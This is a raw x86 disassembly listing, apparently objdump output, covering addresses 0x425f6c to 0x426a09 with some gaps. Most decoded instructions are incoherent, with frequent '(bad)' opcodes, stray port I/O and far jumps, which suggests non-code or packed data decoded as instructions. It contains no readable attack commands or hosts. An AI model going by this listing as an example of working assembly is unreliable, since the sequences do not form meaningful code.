  425f6c:	add    BYTE PTR [eax],al
  425f6e:	pop    ebx
  425f6f:	retf   0x2026
  425f72:	call   0x7c48:0x9d5c3754
  425f79:	push   ds
  425f7a:	out    dx,eax
  425f7b:	xchg   BYTE PTR [ebx-0x15b7a737],dl
  425f81:	(bad)  
  425f82:	clc    
  425f83:	nop
  425f84:	mov    eax,ds:0xbf0d03e8
  425f89:	jae    0x425fd1
  425f8b:	hlt    
  425f8c:	add    DWORD PTR [ecx+0x21e80550],edx
  425f92:	pop    ebp
  425f93:	add    al,BYTE PTR [edi+0x8]
  425f96:	inc    edx
  425f97:	jmp    0x9ea2a539
  425f9c:	sub    ah,BYTE PTR cs:[ecx+0x56]
  425fa0:	or     al,0x89
  425fa2:	shl    al,1
  425fa4:	mov    DWORD PTR [ebx+0x72c9af84],edi
  425faa:	cmp    eax,0xea7238aa
  425faf:	push   es
  425fb0:	inc    esp
  425fb1:	inc    ebx
  425fb2:	xor    eax,0x5e3023d8
  425fb7:	js     0x426026
  425fb9:	jnp    0x42601f
  425fbb:	stos   BYTE PTR es:[edi],al
  425fbc:	mov    esi,DWORD PTR [ebp-0x6b]
  425fbf:	ins    BYTE PTR es:[edi],dx
  425fc0:	nop
  425fc1:	stos   DWORD PTR es:[edi],eax
  425fc2:	pop    ebx
  425fc3:	adc    edi,eax
  425fc5:	push   ebx
  425fc6:	(bad)  
  425fc7:	and    eax,0x2a73b22c
  425fcc:	scas   eax,DWORD PTR es:[edi]
  425fcd:	push   cs
  425fce:	(bad)  
  425fcf:	clc    
  425fd0:	cmc    
  425fd1:	sbb    bh,BYTE PTR [ebx]
  425fd3:	dec    ebp
  425fd4:	out    0xa,al
  425fd6:	pop    ss
  425fd7:	hlt    
  425fd8:	fsub   QWORD PTR [ecx]
  425fda:	mov    bh,0xb6
  425fdc:	stos   BYTE PTR es:[edi],al
  425fdd:	inc    edi
  425fde:	jns    0x425f79
  425fe0:	pop    esp
  425fe1:	sti    
  425fe2:	jmp    0xa51d263f
  425fe7:	stos   BYTE PTR es:[edi],al
  425fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fe9:	and    DWORD PTR ds:0x380b8d7d,eax
  425fef:	and    DWORD PTR [esi],edx
  425ff1:	cwde   
  425ff2:	iret   
  425ff3:	(bad)  
  425ff4:	idiv   DWORD PTR [eax-0x29916bfe]
  425ffa:	push   0x5b8d246e
  425fff:	dec    esp
  426000:	mov    DWORD PTR [esi-0x4ab76a9f],edx
  426006:	idiv   BYTE PTR [edi-0x2]
  426009:	int3   
  42600a:	mov    ebx,0x74956ebf
  42600f:	mov    ebp,0x8de46f31
  426014:	push   ds
  426015:	mov    esi,esp
  426017:	xor    cl,BYTE PTR [esi+0xd]
  42601a:	mov    bl,0x54
  42601c:	pop    esp
  42601d:	jno    0x425f9f
  42601f:	pop    ecx
  426020:	inc    esp
  426021:	push   esi
  426022:	jl     0x425fbf
  426024:	std    
  426025:	cmp    BYTE PTR ds:0x452adf0b,al
  42602b:	cwde   
  42602c:	out    dx,al
  42602d:	(bad)  
  42602e:	leave  
  42602f:	xor    al,0xf7
  426031:	dec    esp
  426032:	sbb    ch,dh
  426034:	into   
  426035:	cmp    edi,ebx
  426037:	scas   al,BYTE PTR es:[edi]
  426038:	lods   al,BYTE PTR ds:[esi]
  426039:	pop    edi
  42603a:	dec    edx
  42603b:	stos   BYTE PTR es:[edi],al
  42603c:	loopne 0x426090
  42603e:	push   0xd003768f
  426043:	sub    al,0xf3
  426045:	push   0x5c291534
  42604a:	jle    0x426082
  42604c:	gs fwait
  42604e:	sahf   
  42604f:	sbb    BYTE PTR [ebp+0x5],dl
  426052:	adc    DWORD PTR [esi],eax
  426054:	mov    eax,ds:0x95603920
  426059:	ins    DWORD PTR es:[edi],dx
  42605a:	xor    DWORD PTR [esi+0x67b34cbd],ebp
  426060:	dec    edx
  426061:	ins    DWORD PTR es:[edi],dx
  426062:	and    ch,BYTE PTR [ecx+0x6d]
  426065:	retf   0xb6a
  426068:	out    dx,eax
  426069:	push   edx
  42606a:	stos   BYTE PTR es:[edi],al
  42606b:	push   esp
  42606c:	sub    al,0x48
	...
  4260d6:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	mov    ah,0xa0
  4260e4:	repz pushf 
  4260e6:	addr16 cwde 
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	add    BYTE PTR [ecx],al
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	xchg   esi,eax
  4260ef:	js     0x426099
  4260f1:	lock imul esi,DWORD PTR [edx-0x5975bcd7],0x1b02568f
  4260fc:	outs   dx,BYTE PTR ds:[esi]
  4260fd:	xlat   BYTE PTR ds:[ebx]
  4260fe:	mov    ebx,0xbe0c1760
  426103:	aam    0xbb
  426105:	or     ebx,ebp
  426107:	ret    0x3144
  42610a:	daa    
  42610b:	or     eax,0x3e88b511
  426110:	int3   
  426111:	ror    DWORD PTR [eax-0x63f643b0],cl
  426117:	sar    DWORD PTR [ebp-0x4f],cl
  42611a:	mov    ah,0x83
  42611c:	lea    ebp,[ebx+0xf25ea60]
  426122:	hlt    
  426123:	icebp  
  426124:	scas   eax,DWORD PTR es:[edi]
  426125:	sub    eax,0x85cfa753
  42612a:	(bad)  
  42612c:	inc    esp
  42612d:	outs   dx,DWORD PTR ds:[esi]
  42612e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42612f:	cmp    ecx,DWORD PTR [ecx-0x6c]
  426132:	out    dx,al
  426133:	push   eax
  426134:	imul   edx,DWORD PTR [ebp-0x115ea5d2],0xffffffba
  42613b:	xchg   esi,eax
  42613c:	mov    edi,0x716a21b0
  426141:	mov    cl,0x52
  426143:	dec    edx
  426144:	iret   
  426145:	out    dx,al
  426146:	fcmove st,st(5)
  426148:	jno    0x4260f3
  42614a:	xchg   BYTE PTR [esi+0x39],al
  42614d:	jp     0x4261b6
  42614f:	push   cs
  426150:	mov    ds:0x71b04285,eax
  426155:	xor    bl,BYTE PTR [ebx+0x4f]
  426158:	sub    DWORD PTR [edx],edx
  42615a:	pop    esi
  42615b:	mov    al,ds:0x13be3dc9
  426160:	test   DWORD PTR [esi+0x44],edx
  426163:	sti    
  426164:	imul   ebp,DWORD PTR [esi],0xffffff83
  426167:	loope  0x426154
  426169:	xor    BYTE PTR [esp+edx*8+0x79],ah
  42616d:	inc    edx
  42616e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42616f:	adc    BYTE PTR [ecx],0xfb
  426172:	test   eax,0x25500065
  426177:	pop    edx
  426178:	stos   DWORD PTR es:[edi],eax
  426179:	cmp    ecx,DWORD PTR [ecx-0x60]
  42617c:	jns    0x42616e
  42617e:	pop    ss
  42617f:	js     0x4261a6
  426181:	pusha  
  426182:	jne    0x426148
  426184:	pop    ds
  426185:	mov    edx,0xddb6d57f
  42618a:	and    dh,BYTE PTR [edx-0x43]
  42618d:	in     eax,dx
  42618e:	lea    ebp,ds:0x967ca752
  426194:	out    dx,eax
  426195:	add    eax,0xa76c7fcb
  42619a:	sbb    eax,0x76b333d0
  42619f:	fwait
  4261a0:	lahf   
  4261a1:	std    
  4261a2:	push   ebx
  4261a3:	and    al,0x40
  4261a5:	loopne 0x4261ea
  4261a7:	fsub   DWORD PTR [edi-0x7ce868a8]
  4261ad:	mov    esp,0x5ef2437c
  4261b2:	add    BYTE PTR [edi-0x9],0x2c
  4261b6:	fistp  QWORD PTR [edi+0x7312aeb9]
  4261bc:	js     0x42622d
  4261be:	dec    eax
  4261bf:	xchg   esi,eax
  4261c0:	mul    ecx
  4261c2:	lahf   
  4261c3:	xchg   esp,eax
  4261c4:	sub    BYTE PTR [eax+ebp*8+0x48ceb484],bl
  4261cb:	fld    DWORD PTR ds:0xb35e33a5
  4261d1:	mov    ds:0x137fe95e,al
  4261d7:	fidiv  DWORD PTR [ecx]
  4261d9:	pop    edx
  4261da:	call   0xfca3:0x1d9a19c5
  4261e1:	push   ds
  4261e2:	pop    eax
  4261e3:	mov    WORD PTR [edi+0x5a5e5d62],ss
  4261e9:	xchg   ecx,eax
  4261ea:	mov    al,0x5b
  4261ec:	scas   eax,DWORD PTR es:[edi]
  4261ed:	ret    0x0
	...
  426254:	add    BYTE PTR [eax],al
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx+0x44801227],0xffffffc6
  426266:	addr16 cdq 
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	gs popf 
  426270:	inc    ebp
  426271:	inc    ebx
  426272:	stc    
  426273:	xchg   DWORD PTR [edi-0x5c830d2],edx
  426279:	loope  0x42620e
  42627b:	mov    eax,0xe6d332d5
  426280:	inc    ebx
  426281:	xchg   edi,eax
  426282:	pop    ebx
  426283:	fs adc al,0x24
  426286:	xlat   BYTE PTR ds:[ebx]
  426287:	sahf   
  426288:	aam    0x39
  42628a:	pop    es
  42628b:	pop    ss
  42628c:	adc    al,0xa3
  42628e:	scas   eax,DWORD PTR es:[edi]
  42628f:	je     0x42622d
  426291:	push   edx
  426292:	xchg   BYTE PTR [eax+0x4bd78cd4],cl
  426298:	ror    BYTE PTR [edx],cl
  42629a:	mov    ds:0x34c16e9a,eax
  42629f:	xchg   esp,eax
  4262a0:	mov    ecx,DWORD PTR ds:0x3cc0fc6
  4262a6:	and    BYTE PTR [eax+ecx*2-0x37],al
  4262aa:	retf   0xe0cc
  4262ad:	fcomp  DWORD PTR [ebx+0x29]
  4262b0:	and    eax,0x8d6ddb82
  4262b5:	imul   edx,DWORD PTR [edi-0xc],0x61863246
  4262bc:	mov    eax,ds:0xb59f10bd
  4262c1:	loop   0x4262c7
  4262c3:	push   eax
  4262c4:	mov    ebp,0xa962fa01
  4262c9:	hlt    
  4262ca:	add    al,0x97
  4262cc:	dec    ecx
  4262cd:	add    dl,BYTE PTR [eax-0x52ccb95d]
  4262d3:	adc    ecx,eax
  4262d5:	ja     0x426299
  4262d7:	sub    BYTE PTR [ecx+ebp*4-0x2c],bl
  4262db:	or     al,0xcd
  4262dd:	and    dl,BYTE PTR [edx+0x20837b00]
  4262e3:	and    bh,ch
  4262e5:	push   esi
  4262e6:	sub    al,0xb0
  4262e8:	retf   
  4262e9:	pop    ss
  4262ea:	(bad)  
  4262eb:	icebp  
  4262ec:	push   ecx
  4262ed:	icebp  
  4262ee:	sbb    edi,ebx
  4262f0:	pop    edx
  4262f1:	adc    BYTE PTR [edx+ebx*1+0x51e76680],0xf0
  4262f9:	sub    DWORD PTR [ebp-0x6df5aa45],eax
  4262ff:	push   eax
  426300:	jle    0x426364
  426302:	mov    ch,BYTE PTR [eax+0x36]
  426305:	loope  0x4262ae
  426307:	das    
  426308:	dec    ecx
  426309:	inc    eax
  42630a:	xchg   ecx,eax
  42630b:	stos   DWORD PTR es:[edi],eax
  42630c:	in     al,0xad
  42630e:	jle    0x4262d6
  426310:	mov    bl,0x2f
  426312:	push   esi
  426313:	fstp   DWORD PTR [edx]
  426315:	into   
  426316:	push   edx
  426317:	test   al,0x64
  426319:	inc    esi
  42631a:	mov    al,0x58
  42631c:	ss dec ebp
  42631e:	or     al,dl
  426320:	sub    edx,DWORD PTR [ecx]
  426322:	sbb    al,cl
  426324:	xlat   BYTE PTR ds:[ebx]
  426325:	pop    ebp
  426326:	xlat   BYTE PTR ds:[ebx]
  426327:	adc    al,0x3d
  426329:	pop    ebx
  42632a:	jmp    0x426312
  42632c:	mov    ch,0xae
  42632e:	cmp    eax,0xb34a526e
  426333:	call   0xb9fb297e
  426338:	inc    ebp
  426339:	outs   dx,DWORD PTR ds:[esi]
  42633a:	fs scas al,BYTE PTR es:[edi]
  42633c:	in     al,dx
  42633d:	xor    BYTE PTR [edx],bh
  42633f:	or     edi,DWORD PTR [esi+ecx*4]
  426342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426343:	pop    es
  426344:	(bad)  
  426345:	call   0x9682462f
  42634a:	lock inc ebp
  42634c:	je     0x42635c
  42634e:	mov    dh,0x77
  426350:	mov    esp,0xaeb6237c
  426355:	push   ds
  426356:	in     al,0x48
  426358:	aaa    
  426359:	in     al,dx
  42635a:	mov    dh,0x5d
  42635c:	pop    ecx
  42635d:	pop    edx
  42635e:	(bad)  
  42635f:	shl    DWORD PTR [ecx-0x6b],1
  426362:	add    BYTE PTR [eax-0x7e],ah
  426365:	retf   0xc196
  426368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426369:	xor    BYTE PTR [edx],0x60
  42636c:	jne    0x426345
	...
  4263d6:	push   esp
  4263d7:	and    eax,0xeefd4e8d
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x2d61566f
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	dec    ebp
  4263ef:	addr16 aas 
  4263f1:	sub    eax,0xb55fe8ce
  4263f6:	lods   eax,DWORD PTR ds:[esi]
  4263f7:	out    0x17,eax
  4263f9:	mov    esi,0xba44b169
  4263fe:	push   edx
  4263ff:	mov    cl,0x18
  426401:	enter  0x432d,0x37
  426405:	push   cs
  426406:	mov    di,WORD PTR [esi+eiz*4-0x73889ee0]
  42640e:	mov    al,BYTE PTR [ebp-0x3779a727]
  426414:	icebp  
  426415:	jo     0x42640b
  426417:	or     al,0x27
  426419:	ds jl  0x4263c6
  42641c:	ss test al,0xd1
  42641f:	ror    DWORD PTR [edi-0x64850d57],1
  426425:	sub    ah,BYTE PTR [eax+0x5d2b205e]
  42642b:	push   ebp
  42642c:	daa    
  42642d:	push   ebp
  42642e:	push   0x70d5ea49
  426433:	sbb    eax,0x93daea66
  426438:	or     DWORD PTR [edx+0x715ecd0e],esi
  42643e:	jnp    0x4263db
  426440:	push   es
  426441:	call   0xf772:0x273bec39
  426448:	pop    es
  426449:	test   bl,ch
  42644b:	cmp    esi,0x4c
  42644e:	cli    
  42644f:	mov    esi,0xe3765dea
  426454:	sbb    edi,DWORD PTR [ecx]
  426456:	cmp    al,0x4d
  426458:	xchg   edi,eax
  426459:	fcomp  DWORD PTR [edi+ecx*4+0x280ee090]
  426460:	jmp    0x41b:0xb87fd2b1
  426467:	pop    ds
  426468:	mov    ecx,ebp
  42646a:	mov    edi,0x9bd04397
  42646f:	and    al,0x5f
  426471:	aaa    
  426472:	jmp    0x426407
  426474:	xchg   BYTE PTR [ebp-0x1e],bl
  426477:	cmp    al,0x20
  426479:	dec    esi
  42647a:	gs xor cl,cl
  42647d:	ror    bh,cl
  42647f:	jle    0x42643a
  426481:	std    
  426482:	ins    BYTE PTR es:[edi],dx
  426483:	and    eax,0x53fc40a3
  426488:	add    BYTE PTR [edx+0x3ff68a57],bh
  42648e:	in     al,dx
  42648f:	cs dec ebx
  426491:	and    al,dh
  426493:	sahf   
  426494:	std    
  426495:	stc    
  426496:	mov    ecx,0x91c4e04f
  42649b:	push   edi
  42649c:	mov    bh,0x2b
  42649e:	xchg   esp,eax
  42649f:	cwde   
  4264a0:	cmp    al,0x63
  4264a2:	adc    BYTE PTR [edx],0xd4
  4264a5:	inc    eax
  4264a6:	push   edi
  4264a7:	mov    eax,0x94aedf00
  4264ac:	call   0x307e6268
  4264b1:	or     ecx,eax
  4264b3:	dec    eax
  4264b4:	(bad)  
  4264b5:	fild   WORD PTR [edx+0x4d45a8ad]
  4264bb:	aas    
  4264bc:	jle    0x426517
  4264be:	stos   DWORD PTR es:[edi],eax
  4264bf:	mov    esp,0xd0cc4202
  4264c4:	mov    cl,dh
  4264c6:	push   0xdf229c00
  4264cb:	add    al,0x8a
  4264cd:	push   esp
  4264ce:	imul   BYTE PTR [ebp-0x682f8bcd]
  4264d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4264d5:	fcmovb st,st(4)
  4264d7:	mov    eax,0x402fcd4b
  4264dc:	retf   
  4264dd:	cmc    
  4264de:	ja     0x4264cb
  4264e0:	(bad)  [edi+0x1a15c4e4]
  4264e6:	loope  0x4264ba
  4264e8:	stos   BYTE PTR es:[edi],al
  4264e9:	aam    0x28
  4264eb:	(bad)  
  4264ec:	out    0x7e,al
	...
  426556:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	vmwrite ecx,DWORD PTR [edx+0x56ec0a85]
  426565:	fbld   TBYTE PTR [edi-0x65]
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	cli    
  42656f:	add    BYTE PTR [eax+eiz*1-0x1eb459ce],cl
  426576:	adc    edi,eax
  426578:	mov    bh,0xa3
  42657a:	in     eax,0x26
  42657c:	mov    bh,0xae
  42657e:	and    eax,0x1510ca17
  426583:	or     BYTE PTR [edx+0x10],dl
  426586:	jg     0x4265c0
  426588:	sub    al,0x3
  42658a:	inc    edx
  42658b:	jo     0x4265b3
  42658d:	pop    ecx
  42658e:	dec    ebx
  42658f:	adc    edi,edx
  426591:	push   edx
  426592:	pop    ss
  426593:	sub    BYTE PTR [edi],ah
  426595:	inc    ebp
  426596:	adc    cl,BYTE PTR [ebx+0x562f68a6]
  42659c:	inc    esp
  42659d:	sub    BYTE PTR [ebx+0x21],bh
  4265a0:	adc    esp,ebp
  4265a2:	aam    0xd5
  4265a4:	rcr    DWORD PTR [ecx+0x7f],0xe
  4265a8:	jmp    0x45e80284
  4265ad:	cmp    dl,BYTE PTR [esi+0x6ee88aed]
  4265b3:	xchg   edx,eax
  4265b4:	retf   
  4265b5:	das    
  4265b6:	or     bl,cl
  4265b8:	push   edi
  4265b9:	lods   al,BYTE PTR ds:[esi]
  4265ba:	mov    al,0xe1
  4265bc:	jnp    0x42661d
  4265be:	inc    eax
  4265bf:	inc    ebp
  4265c0:	xchg   ebx,eax
  4265c1:	pusha  
  4265c2:	out    0x1c,al
  4265c4:	imul   edi,ebp,0x1
  4265c7:	je     0x426607
  4265c9:	(bad)  
  4265ca:	das    
  4265cb:	enter  0x3fc5,0xc8
  4265cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265d0:	scas   eax,DWORD PTR es:[edi]
  4265d1:	adc    eax,0x6beedd9
  4265d6:	aaa    
  4265d7:	push   eax
  4265d8:	add    DWORD PTR [edi+ebp*2+0x5c],edx
  4265dc:	test   al,0x36
  4265de:	xor    ch,dl
  4265e0:	iret   
  4265e1:	jl     0x426645
  4265e3:	cli    
  4265e4:	sahf   
  4265e5:	out    0x93,al
  4265e7:	fld    QWORD PTR ds:0xb6cf4f50
  4265ed:	sub    al,0x24
  4265ef:	stos   BYTE PTR es:[edi],al
  4265f0:	mov    DWORD PTR [esi+ecx*8-0x299a7e0],edx
  4265f7:	push   edx
  4265f8:	adc    DWORD PTR [edx-0x14c42e3f],0x11
  4265ff:	xchg   DWORD PTR [ebx+ebx*2+0x3f0931d6],esp
  426606:	and    eax,DWORD PTR [ecx-0x42]
  426609:	adc    eax,0xc6ca2987
  42660e:	push   cs
  42660f:	sub    ah,0xca
  426612:	mov    ah,0x51
  426614:	mov    bh,0xa4
  426616:	cmp    BYTE PTR [esi],dh
  426618:	xchg   ebx,eax
  426619:	mov    edi,0x705dacb9
  42661e:	dec    esi
  42661f:	js     0x4265a2
  426621:	xor    ebp,DWORD PTR [edi+0x27]
  426624:	addr16 dec edi
  426626:	or     edx,DWORD PTR [edi+0x236be052]
  42662c:	and    al,0x31
  42662e:	in     al,dx
  42662f:	aam    0x43
  426631:	mov    eax,ds:0xd81925ce
  426636:	jb     0x426631
  426638:	(bad)  
  426639:	icebp  
  42663a:	push   es
  42663b:	call   DWORD PTR [ecx-0x59eb6979]
  426641:	popf   
  426642:	dec    ebx
  426643:	loopne 0x4266a7
  426645:	rcl    BYTE PTR [eax+0x16826c5f],1
  42664b:	enter  0x792b,0xcc
  42664f:	sub    al,dl
  426651:	rcl    DWORD PTR [esi-0x64],cl
  426654:	add    DWORD PTR [eax],eax
  426656:	gs loopne 0x426608
  426659:	inc    esi
  42665a:	(bad)  
  42665b:	xchg   esi,eax
  42665c:	push   esi
  42665d:	ret    0x7a92
  426660:	scas   eax,DWORD PTR es:[edi]
  426661:	out    0x96,al
  426663:	fwait
  426664:	out    dx,eax
  426665:	repz pop ebx
  426667:	jnp    0x426625
  426669:	enter  0x15e7,0x10
  42666d:	jno    0x42666f
	...
  4266d3:	add    BYTE PTR [eax],al
  4266d5:	add    BYTE PTR [edx],dl
  4266d7:	retf   
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi+0xe7b6da4]
  4266e4:	jae    0x426750
  4266e6:	addr16 pushf 
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	jb     0x426709
  4266f0:	and    cl,BYTE PTR [ebx+0xb47acbb]
  4266f6:	or     al,BYTE PTR [esi+0x3b8f2fed]
  4266fc:	xor    eax,0x24f328a0
  426701:	pushf  
  426702:	dec    ebx
  426703:	pop    ebp
  426704:	imul   ecx,DWORD PTR [ecx+edi*4],0xffffff95
  426708:	push   ss
  426709:	mov    dl,0x3c
  42670b:	or     cl,BYTE PTR [ecx-0x4a422f4b]
  426711:	xlat   BYTE PTR ds:[ebx]
  426712:	daa    
  426713:	xor    ah,BYTE PTR [edx+ebp*8-0x4a]
  426717:	xchg   BYTE PTR [ebx],al
  426719:	inc    eax
  42671a:	sbb    al,0x83
  42671c:	and    bl,bh
  42671e:	loopne 0x4266dc
  426720:	in     al,0xd
  426722:	mov    edx,DWORD PTR [edi]
  426724:	mov    ds:0x4e69728,al
  426729:	pop    esi
  42672a:	ror    ebx,1
  42672c:	dec    edx
  42672d:	fidiv  DWORD PTR [ecx-0x162fe55c]
  426733:	or     dl,BYTE PTR [edx+0x66]
  426736:	mov    edx,0x507a0485
  42673b:	test   eax,0xe4c97d8
  426740:	addr16 ret 
  426742:	(bad)  [edx+edx*2-0x2ff5c3c6]
  426749:	pop    esi
  42674a:	inc    esp
  42674b:	stc    
  42674c:	out    dx,al
  42674d:	fcomp  DWORD PTR [ecx+0x12]
  426750:	outs   dx,DWORD PTR ds:[esi]
  426751:	(bad)
  426754:	add    al,0xf3
  426756:	mov    eax,ds:0x6b94030e
  42675b:	cld    
  42675c:	clc    
  42675d:	les    edx,FWORD PTR [edx-0x7f22f5ea]
  426763:	fwait
  426764:	sub    DWORD PTR [esi],esi
  426766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426768:	pop    esp
  426769:	cmp    al,0xde
  42676b:	pushf  
  42676c:	std    
  42676d:	or     eax,0x4f56bf35
  426772:	push   edi
  426773:	(bad)  [ecx-0x6534fe38]
  426779:	xor    eax,0xffffff9d
  42677c:	mov    esp,0x7d1384b7
  426781:	dec    edi
  426782:	sahf   
  426783:	mov    gs,WORD PTR [ebx+0x279cf0e8]
  426789:	call   FWORD PTR [eax-0x24]
  42678c:	fldenv [ebp+eax*1-0x6e93f13b]
  426793:	sub    cl,ah
  426795:	in     al,dx
  426796:	cmp    al,0x90
  426798:	push   0xd3de207b
  42679d:	jmp    0x89e2:0xff5327b8
  4267a4:	mov    ch,0x7a
  4267a6:	pop    esp
  4267a7:	cmc    
  4267a8:	loop   0x426756
  4267aa:	in     eax,0xc8
  4267ac:	mov    ebp,0xdd6695ca
  4267b1:	inc    eax
  4267b2:	dec    eax
  4267b3:	fwait
  4267b4:	sbb    BYTE PTR [esi+edi*2-0x424eb44],0x2f
  4267bc:	je     0x4267c2
  4267be:	mov    BYTE PTR [ecx-0x65468b32],dl
  4267c4:	inc    ebx
  4267c5:	daa    
  4267c6:	retf   
  4267c7:	ds arpl dx,ax
  4267ca:	xor    al,0x9a
  4267cc:	adc    cl,al
  4267ce:	sbb    esp,edi
  4267d0:	inc    eax
  4267d1:	aas    
  4267d2:	sub    DWORD PTR [edi-0x53cc50bd],0xffffffa1
  4267d9:	sahf   
  4267da:	sbb    esi,DWORD PTR [eax+0x21]
  4267dd:	sub    ah,dl
  4267df:	nop
  4267e0:	or     ebx,DWORD PTR [eax-0x57d33067]
  4267e6:	pop    ebx
  4267e7:	aas    
  4267e8:	or     eax,0xc4530c85
  4267ed:	loop   0x4267ef
	...
  426853:	add    BYTE PTR [eax],al
  426855:	add    BYTE PTR [eax-0xd53173],bh
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	xchg   esp,eax
  426863:	outs   dx,BYTE PTR ds:[esi]
  426864:	js     0x4268c3
  426866:	addr16 popf 
  426868:	add    DWORD PTR [eax],eax
  42686a:	add    BYTE PTR [ecx],al
  42686c:	add    BYTE PTR [eax],al
  42686e:	pop    esi
  42686f:	les    esp,FWORD PTR [esp+ebx*1]
  426872:	push   edi
  426873:	popf   
  426874:	or     DWORD PTR [ebx+0x11bc04b0],eax
  42687a:	fisubr WORD PTR [edi+edx*8]
  42687d:	xchg   edi,eax
  42687e:	adc    DWORD PTR [esi+eiz*4],esi
  426881:	mov    ds:0x3152c911,eax
  426886:	jmp    0xca42ee5a
  42688b:	or     ebp,DWORD PTR [ebx]
  42688d:	mov    WORD PTR [edi],ds
  42688f:	fmul   st(1),st
  426891:	lods   eax,DWORD PTR ds:[esi]
  426892:	or     ecx,DWORD PTR [ebp-0x7b7a606b]
  426898:	xchg   al,bh
  42689a:	aad    0x16
  42689c:	fisub  WORD PTR [esp+edx*1+0x9]
  4268a0:	adc    DWORD PTR [edi],esp
  4268a2:	adc    DWORD PTR [eax+ebp*4+0x4daa2742],ebx
  4268a9:	das    
  4268aa:	aam    0x99
  4268ac:	out    dx,al
  4268ad:	pop    ebx
  4268ae:	cmp    eax,0xed663a07
  4268b3:	mov    eax,ds:0x30c95553
  4268b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268b9:	jmp    0x7ced:0xc0f07ccb
  4268c0:	addr16 push ebp
  4268c2:	sti    
  4268c3:	inc    ebp
  4268c4:	jne    0x426854
  4268c6:	add    al,0xe0
  4268c8:	or     dh,al
  4268ca:	push   0xe78bd385
  4268cf:	adc    ecx,DWORD PTR [eax]
  4268d1:	xor    al,0x24
  4268d3:	call   0x43ae:0xaa7186a4
  4268da:	adc    al,BYTE PTR [edi]
  4268dc:	xchg   ebx,eax
  4268dd:	inc    ebp
  4268df:	jnp    0x42695e
  4268e1:	jl     0x426946
  4268e3:	and    BYTE PTR [ebp+0x58],dh
  4268e6:	les    ecx,FWORD PTR [ebx]
  4268e8:	lock xor ch,0xea
  4268ec:	ins    DWORD PTR es:[edi],dx
  4268ed:	rcl    edx,1
  4268ef:	pop    esi
  4268f0:	pop    ecx
  4268f1:	les    edi,FWORD PTR [esi+0x51d1767d]
  4268f7:	or     dl,cl
  4268f9:	push   ecx
  4268fa:	ret    0x484c
  4268fd:	mov    bh,0xca
  4268ff:	and    eax,0x6f7b4cb6
  426904:	add    eax,0x4580401f
  426909:	jg     0x426903
  42690b:	retf   
  42690c:	xchg   edx,eax
  42690d:	cmp    bl,BYTE PTR [ecx-0xc521594]
  426913:	call   0x2a70:0x94da6976
  42691a:	aaa    
  42691b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42691c:	mov    al,0x5b
  42691e:	aaa    
  42691f:	adc    eax,0x6951293d
  426924:	push   ds
  426925:	push   es
  426926:	add    al,0x5c
  426928:	xor    al,0x59
  42692a:	cmp    DWORD PTR [ecx],eax
  42692c:	push   ecx
  42692d:	icebp  
  42692e:	inc    ebp
  42692f:	or     al,0xdb
  426931:	xor    BYTE PTR [esp+eiz*4+0x26],dl
  426935:	dec    esi
  426936:	mov    ds:0x4f77d276,al
  42693b:	ins    BYTE PTR es:[edi],dx
  42693c:	fiadd  WORD PTR [edx-0x4c]
  42693f:	cmp    eax,0x793948a8
  426944:	pop    esi
  426945:	retf   
  426946:	cli    
  426947:	dec    ebx
  426948:	push   0xad6b0096
  42694d:	imul   edi,DWORD PTR [edx-0x15586b1a],0x48
  426954:	xchg   edx,eax
  426955:	daa    
  426956:	dec    edi
  426957:	push   cs
  426958:	js     0x426902
  42695a:	cmp    eax,0x9348225e
  42695f:	retf   0x2b9
  426962:	movd   mm1,DWORD PTR [ecx-0x1]
  426966:	(bad)  
  426967:	bound  ebx,QWORD PTR [ebx]
  426969:	test   esp,ebp
  42696b:	sti    
  42696c:	sub    edi,DWORD PTR [eax+0x0]
	...
  4269d6:	mov    WORD PTR [esi+0x7d],cs
  4269d9:	jge    0x4269da
  4269db:	jg     0x426969
  4269dd:	jmp    FWORD PTR [ebx]
  4269df:	in     al,dx
  4269e0:	lahf   
  4269e1:	mov    eax,DWORD PTR [ecx+0x67601745]
  4269e7:	sahf   
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	xor    ebp,eax
  4269f0:	and    al,0x4f
  4269f2:	dec    ebx
  4269f3:	sbb    ebx,eax
  4269f5:	adc    eax,0xf3fc50a9
  4269fa:	dec    DWORD PTR [esi]
  4269fc:	nop
  4269fd:	jae    0x426a5e
  4269ff:	lea    ebp,[esi-0xa00a819]
  426a05:	and    esp,ebp
  426a07:	ja     0x4269a7
  426a09:	push   edx
